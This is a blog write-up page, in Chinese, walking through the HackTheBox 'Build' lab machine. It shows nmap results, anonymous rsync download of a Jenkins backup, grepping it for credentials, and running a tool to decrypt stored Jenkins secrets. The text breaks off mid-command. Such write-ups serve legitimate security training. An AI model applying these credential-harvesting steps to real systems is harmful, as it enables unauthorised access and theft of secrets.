@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- Google Fonts -->
+    <link rel="stylesheet" type="text/css" href="https://fonts.font.im/css?family=LXGW+WenKai+Mono+TC:normal,bold,italic">
+    <link rel="stylesheet" type="text/css" href="https://fonts.font.im/css?family=Inconsolata:normal,bold">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 Nmap123456789101112131415">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox--HTB Build Writeup">
+<meta property="og:url" content="https://n0nome.github.io/2025/08/12/Build/Build/index.html">
+<meta property="og:site_name" content="N0nome&#96;s Fucking Life">
+<meta property="og:description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 Nmap123456789101112131415">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://n0nome.github.io/images/build.png">
+<meta property="og:image" content="https://n0nome.github.io/images/build-1.png">
+<meta property="og:image" content="https://n0nome.github.io/images/build-2.png">
+<meta property="og:image" content="https://n0nome.github.io/images/build-3.png">
+<meta property="og:image" content="https://n0nome.github.io/images/build-4.png">
+<meta property="og:image" content="https://n0nome.github.io/images/build-5.png">
+<meta property="og:image" content="https://n0nome.github.io/images/build-6.png">
+<meta property="og:image" content="https://n0nome.github.io/images/build-7.png">
+<meta property="og:image" content="https://n0nome.github.io/images/build-8.png">
+<meta property="og:image" content="https://n0nome.github.io/images/build-9.png">
+<meta property="og:image" content="https://n0nome.github.io/images/build-10.png">
+<meta property="og:image" content="https://n0nome.github.io/images/build-11.png">
+<meta property="og:image" content="https://n0nome.github.io/images/build-12.png">
+<meta property="og:image" content="https://n0nome.github.io/images/build-13.png">
+<meta property="og:image" content="https://n0nome.github.io/images/build-14.png">
+<meta property="og:image" content="https://n0nome.github.io/images/build-15.png">
+<meta property="og:image" content="https://n0nome.github.io/images/build-16.png">
+<meta property="og:image" content="https://n0nome.github.io/images/build-17.png">
+<meta property="og:image" content="https://n0nome.github.io/images/build-18.png">
+<meta property="article:published_time" content="2025-08-12T01:55:09.904Z">
+<meta property="article:modified_time" content="2025-08-12T01:55:10.012Z">
+<meta property="article:author" content="n0nome">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://n0nome.github.io/images/build.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/laojun.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/laojun.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/laojun.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox--HTB Build Writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-RXS95XH60B"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-RXS95XH60B');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+    
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li><!--
+     --><!--
+       --><li><a href="https://n0nome.github.io/tags/random/">random</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/07/30/Manage/Manage/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/08/12/Build/Build/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/08/12/Build/Build/&text=HackTheBox--HTB Build Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/08/12/Build/Build/&title=HackTheBox--HTB Build Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/08/12/Build/Build/&is_video=false&description=HackTheBox--HTB Build Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox--HTB Build Writeup&body=Check out this article: https://n0nome.github.io/2025/08/12/Build/Build/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/08/12/Build/Build/&title=HackTheBox--HTB Build Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/08/12/Build/Build/&title=HackTheBox--HTB Build Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/08/12/Build/Build/&title=HackTheBox--HTB Build Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/08/12/Build/Build/&title=HackTheBox--HTB Build Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/08/12/Build/Build/&name=HackTheBox--HTB Build Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/08/12/Build/Build/&t=HackTheBox--HTB Build Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    
+
+    
+      <!-- 如果文章被加密，初始隐藏目录 -->
+      <div id="toc" style="">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Rsync-info-enum"><span class="toc-number">1.1.</span> <span class="toc-text">Rsync info enum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jenkins-Hash-Crack"><span class="toc-number">1.2.</span> <span class="toc-text">Jenkins Hash Crack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Root%EF%BC%88Container%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">Shell As Root（Container）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fscan-enum-container-info"><span class="toc-number">2.1.</span> <span class="toc-text">Fscan enum container info</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ligolo-ng-Tunnel-Setting"><span class="toc-number">2.2.</span> <span class="toc-text">Ligolo-ng Tunnel Setting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Change-DNS-Records-And-Rsh-Login"><span class="toc-number">2.3.</span> <span class="toc-text">Change DNS Records And Rsh Login</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Root-LocalMachine"><span class="toc-number">3.</span> <span class="toc-text">Shell As Root(LocalMachine)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashes"><span class="toc-number">3.1.</span> <span class="toc-text">Hashes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E5%A4%96%E9%97%B2%E8%AF%9D"><span class="toc-number">3.2.</span> <span class="toc-text">题外闲话</span></a></li></ol></li></ol>
+      </div>
+     
+ </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox--HTB Build Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">n0nome</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-08-12T01:55:09.904Z" class="dt-published" itemprop="datePublished">2025-08-12</time>
+        
+        (Updated: <time datetime="2025-08-12T01:55:10.012Z" class="dt-updated" itemprop="dateModified">2025-08-12</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/writeup/" rel="tag">writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
+<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><a data-fancybox="gallery" data-src="/images/build.png" data-caption=""><img src="/images/build.png"></a></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE REASON         VERSION                                                             </span><br><span class="line">22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:                                                                                            </span><br><span class="line">|   256 47:21:73:e2:6b:96:<span class="built_in">cd</span>:f9:13:11:af:40:c8:4d:d6:7f (ECDSA)                                                                                                                                                     </span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEwDujdYYBlK34trPdE896KV0Q89NkU0P+PNYKboWAXcOIzRxia7eKQnOZMDcbpjdpUgTlee4VpIiQwwKLfGLqg=</span><br><span class="line">|   256 2b:5e:ba:f3:72:d3:b3:09:<span class="built_in">df</span>:25:41:29:09:f4:7b:f5 (ED25519)                                         </span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAhXu4iRkeWtuE4+/w9QwJeecIUqhFrfTiQsmNatD9LG                        </span><br><span class="line">53/tcp   open  domain  syn-ack ttl 62 PowerDNS                                                            </span><br><span class="line">| dns-nsid:                                                                                               </span><br><span class="line">|   NSID: pdns (70646e73)                                                                                 </span><br><span class="line">|_  id.server: pdns                                                                                       </span><br><span class="line">512/tcp  open  <span class="built_in">exec</span>    syn-ack ttl 63 netkit-rsh rexecd                                                                                                                                                             </span><br><span class="line">513/tcp  open  login?  syn-ack ttl 63</span><br><span class="line">514/tcp  open  shell   syn-ack ttl 63 Netkit rshd</span><br><span class="line">873/tcp  open  rsync   syn-ack ttl 63 (protocol version 31)                                               </span><br><span class="line">3000/tcp open  http    syn-ack ttl 62 Golang net/http server                                                                                                                                                        </span><br><span class="line">|_http-favicon: Unknown favicon MD5: F6E1A9128148EEAD9EFF823C540EF471     </span><br><span class="line">|_http-title: Gitea: Git with a cup of tea                                                                </span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: HEAD GET</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines, Help, RTSPRequest: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Cache-Control: max-age=0, private, must-revalidate, no-transform</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Set-Cookie: i_like_gitea=f7bebdb979c3a877; Path=/; HttpOnly; SameSite=Lax</span><br><span class="line">|     Set-Cookie: _csrf=eca0TcRDEORHvQaj8tFSc9_AW8w6MTc1NDYxOTQwMDA0OTM3MzA5Ng; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax</span><br><span class="line">|     X-Frame-Options: SAMEORIGIN</span><br><span class="line">|     Date: Fri, 08 Aug 2025 02:16:40 GMT</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=<span class="string">&quot;en-US&quot;</span> class=<span class="string">&quot;theme-auto&quot;</span>&gt;</span><br><span class="line">|     &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">|     &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;                         </span><br><span class="line">|     &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt;                                                         </span><br><span class="line">|     &lt;<span class="built_in">link</span> rel=<span class="string">&quot;manifest&quot;</span> href=<span class="string">&quot;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2J1aWxkLnZsOj</span></span><br><span class="line"><span class="string">MwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ                                 </span></span><br><span class="line"><span class="string">|   HTTPOptions:                                                                                          </span></span><br><span class="line"><span class="string">|     HTTP/1.0 405 Method Not Allowed                                                                     </span></span><br><span class="line"><span class="string">|     Allow: HEAD                                                                                         </span></span><br><span class="line"><span class="string">|     Allow: GET                                                                                          </span></span><br><span class="line"><span class="string">|     Cache-Control: max-age=0, private, must-revalidate, no-transform                                    </span></span><br><span class="line"><span class="string">|     Set-Cookie: i_like_gitea=97f5b5cdd496dd33; Path=/; HttpOnly; SameSite=Lax                           </span></span><br><span class="line"><span class="string">|     Set-Cookie: _csrf=NnvprvJO5He_QGgA6WDZd7ahbyU6MTc1NDYxOTQwMDkwMjYwNzE2NQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax                                                                                       </span></span><br><span class="line"><span class="string">|     X-Frame-Options: SAMEORIGIN    </span></span><br><span class="line"><span class="string">|     Date: Fri, 08 Aug 2025 02:16:40 GMT        </span></span><br><span class="line"><span class="string">|_    Content-Length: 0                                                                                   </span></span><br><span class="line"><span class="string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :                                        </span></span><br><span class="line"><span class="string">SF-Port3000-TCP:V=7.97%I=7%D=8/8%Time=68955E07%P=x86_64-pc-linux-gnu%r(Gen</span></span><br><span class="line"><span class="string">SF:ericLines,67,&quot;</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te                                </span><br><span class="line">SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2</span><br><span class="line">SF:0Request<span class="string">&quot;)%r(GetRequest,2536,&quot;</span>HTTP/1\.0\x20200\x20OK\r\nCache-Control:\</span><br><span class="line">SF:x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nConten</span><br><span class="line">SF:t-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea=f</span><br><span class="line">SF:7bebdb979c3a877;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:</span><br><span class="line">SF:\x20_csrf=eca0TcRDEORHvQaj8tFSc9_AW8w6MTc1NDYxOTQwMDA0OTM3MzA5Ng;\x20Pa</span><br><span class="line">SF:th=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options</span><br><span class="line">SF::\x20SAMEORIGIN\r\nDate:\x20Fri,\x2008\x20Aug\x202025\x2002:16:40\x20GM</span><br><span class="line">SF:T\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&quot;en-US\&quot;\x20class=\&quot;theme-a</span><br><span class="line">SF:uto\&quot;&gt;\n&lt;<span class="built_in">head</span>&gt;\n\t&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-</span><br><span class="line">SF:width,\x20initial-scale=1\&quot;&gt;\n\t&lt;title&gt;Gitea:\x20Git\x20with\x20a\x20cu</span><br><span class="line">SF:p\x20of\x20tea&lt;/title&gt;\n\t&lt;<span class="built_in">link</span>\x20rel=\&quot;manifest\&quot;\x20href=\&quot;data:appl</span><br><span class="line">SF:ication/json;<span class="built_in">base64</span>,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSI     </span><br><span class="line">SF:sInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdX                                                                                                                                          </span><br><span class="line">SF:JsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9id</span><br><span class="line">SF:WlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwi</span><br><span class="line">SF:c2l6ZXMiOiI1MTJ<span class="string">&quot;)%r(Help,67,&quot;</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont</span><br><span class="line">SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r</span><br><span class="line">SF:\n400\x20Bad\x20Request<span class="string">&quot;)%r(HTTPOptions,197,&quot;</span>HTTP/1\.0\x20405\x20Method</span><br><span class="line">SF:\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control:</span><br><span class="line">SF:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nSet-C</span><br><span class="line">SF:ookie:\x20i_like_gitea=97f5b5cdd496dd33;\x20Path=/;\x20HttpOnly;\x20Sam</span><br><span class="line">SF:eSite=Lax\r\nSet-Cookie:\x20_csrf=NnvprvJO5He_QGgA6WDZd7ahbyU6MTc1NDYxO</span><br><span class="line">SF:TQwMDkwMjYwNzE2NQ;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSit</span><br><span class="line">SF:e=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2008\x20Aug\x</span><br><span class="line">SF:202025\x2002:16:40\x20GMT\r\nContent-Length:\x200\r\n\r\n<span class="string">&quot;)%r(RTSPReque</span></span><br><span class="line"><span class="string">SF:st,67,&quot;</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plai</span><br><span class="line">SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reques</span><br><span class="line">SF:t<span class="string">&quot;);                                                                                                   </span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Rsync-info-enum"><a href="#Rsync-info-enum" class="headerlink" title="Rsync info enum"></a>Rsync info enum</h3><p>看到512、513、514组团出现，就想到前面的吧唧，但是现在什么信息也没有，也连不上<br>3000端口看一眼是个gitea</p>
+<p><a data-fancybox="gallery" data-src="/images/build-1.png" data-caption=""><img src="/images/build-1.png"></a></p>
+<p>但是我们显示是访客状态改不了这个，还剩一个rsync，找一下hacktricks可以如何进行<br>找到了<a target="_blank" rel="noopener" href="https://hacktricks.boitatech.com.br/pentesting/873-pentesting-rsync">873-pentesting-rsync</a>，尝试一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─$ rsync -av --list-only rsync://<span class="variable">$IP</span>                      </span><br><span class="line">backups         backups</span><br></pre></td></tr></table></figure>
+
+<p>有备份</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">╰─$ rsync -av --list-only rsync://<span class="variable">$IP</span>/backups                                                                                                                                                                   </span><br><span class="line">receiving incremental file list</span><br><span class="line">drwxr-xr-x          4,096 2024/05/02 21:26:31 .</span><br><span class="line">-rw-r--r--    376,289,280 2024/05/02 21:26:19 jenkins.tar.gz</span><br><span class="line"></span><br><span class="line">sent 24 bytes  received 82 bytes  42.40 bytes/sec</span><br><span class="line">total size is 376,289,280  speedup is 3,549,898.87</span><br></pre></td></tr></table></figure>
+
+<p>意外之喜，传过来</p>
+<p><a data-fancybox="gallery" data-src="/images/build-2.png" data-caption=""><img src="/images/build-2.png"></a></p>
+<p>按照这个进行枚举和传过来就行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">╰─$ rsync -a rsync://<span class="variable">$IP</span>/backups/jenkins.tar.gz .                                                                                                                                                               </span><br><span class="line">                                                    </span><br><span class="line">╰─$ <span class="built_in">ls</span> -la                                                                                                                                                                                                    127 ↵ </span><br><span class="line">drwxr-xr-x wansh wansh  50 B  Fri Aug  8 10:28:40 2025  .</span><br><span class="line">drwxr-xr-x wansh wansh 108 B  Fri Aug  8 10:13:27 2025  ..</span><br><span class="line">drwxr-xr-x wansh wansh  30 B  Fri Aug  8 10:18:49 2025  dev</span><br><span class="line">.rw-r--r-- wansh wansh 359 MB Thu May  2 21:26:19 2024  jenkins.tar.gz</span><br><span class="line">.rw-r--r-- root  root  6.1 KB Fri Aug  8 10:17:14 2025  nmap.txt</span><br></pre></td></tr></table></figure>
+
+<p>直接解压，然后就得到了一堆文件</p>
+<p><a data-fancybox="gallery" data-src="/images/build-3.png" data-caption=""><img src="/images/build-3.png"></a></p>
+<h3 id="Jenkins-Hash-Crack"><a href="#Jenkins-Hash-Crack" class="headerlink" title="Jenkins Hash Crack"></a>Jenkins Hash Crack</h3><p>但是对我们有用处的没多少，先用grep枚举一下<br>直接<code>password</code>的话就会有很多干扰的，所以可以先找<code>build.vl</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">╰─$ grep <span class="string">&quot;build.vl&quot;</span> -ri jenkins_configuration</span><br><span class="line">jenkins_configuration/users/admin_8569439066427679502/config.xml:      &lt;emailAddress&gt;admin@build.vl&lt;/emailAddress&gt;</span><br><span class="line">jenkins_configuration/jobs/build/state.xml:          &lt;avatar&gt;http://build.vl:3000/avatar/204239236134d8e6eb156992dd11c53e&lt;/avatar&gt;</span><br><span class="line">jenkins_configuration/jenkins.model.JenkinsLocationConfiguration.xml:  &lt;jenkinsUrl&gt;http://build.vl:5000/&lt;/jenkinsUrl&gt;</span><br><span class="line">jenkins_configuration/org.jenkinsci.plugin.gitea.servers.GiteaServers.xml:      &lt;displayName&gt;gitea.build.vl&lt;/displayName&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后按图索骥可能会方便一点<br>（先加hosts）</p>
+<p>在<code>jenkins_configuration/users/admin_8569439066427679502/config.xml</code>中可以发现一个hash</p>
+<p><a data-fancybox="gallery" data-src="/images/build-4.png" data-caption=""><img src="/images/build-4.png"></a></p>
+<p>然后hashcat解一下发现解不出来，放弃<br>然后在<code>jenkins_configuration/jobs/build/config.xml</code>下又发现一个password</p>
+<p><a data-fancybox="gallery" data-src="/images/build-5.png" data-caption=""><img src="/images/build-5.png"></a></p>
+<p>但是这厮看着不像，Google找一下有没有相关的<br><code>jenkins hash crack</code>——&gt;<a target="_blank" rel="noopener" href="https://www.thesubtlety.com/post/go-decrypt-jenkins/">Go Decrypt Jenkins</a>——&gt;<a target="_blank" rel="noopener" href="https://github.com/thesubtlety/go-decrypt-jenkins/releases/tag/v1.1">go-decrypt-jenkins-linux-amd64</a></p>
+<p>下载下来用一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">╰─$ file go-decrypt-jenkins-linux-amd64 </span><br><span class="line">go-decrypt-jenkins-linux-amd64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=Yctj8nWEuKDxsezI7ydI/UP40A9nTEoPU2mwe4Bw2/S6k3GBinbmhUHM2ZySyU/B31Hx232HppxnVBb-AZn, stripped</span><br><span class="line"></span><br><span class="line">╰─$ <span class="built_in">chmod</span> +x go-decrypt-jenkins-linux-amd64 </span><br><span class="line"></span><br><span class="line">╰─$ ./go-decrypt-jenkins-linux-amd64 -d jenkins_configuration </span><br><span class="line">Searching <span class="keyword">for</span> files <span class="keyword">in</span> jenkins_configuration</span><br><span 